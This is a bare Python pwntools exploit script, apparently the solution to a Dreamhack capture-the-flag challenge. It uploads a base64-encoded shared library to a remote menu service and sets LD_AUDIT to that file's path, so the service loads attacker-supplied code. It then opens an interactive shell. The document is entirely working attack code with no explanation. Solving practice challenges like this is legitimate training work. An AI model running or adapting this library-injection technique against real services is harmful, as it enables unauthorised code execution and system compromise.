from pwn import *
import base64

with open("./libc.so", 'rb') as f:
            data = base64.b64encode(f.read())
                    
p = remote("host1.dreamhack.games", 12780)
p.sendlineafter("> ", str(3))
p.recvuntil("is: ")
pwd = p.recvline().strip()

p.sendlineafter("> ", str(4))

p.sendlineafter(": ", 'libc.so')
p.sendlineafter(": ", data)

p.sendlineafter("> ", str(2))
p.sendlineafter("> ", str(2))

p.sendline("LD_AUDIT")
p.sendline(pwd+'/libc.so')

p.sendlineafter("> ", str(1))
p.sendline("p")

p.interactive()
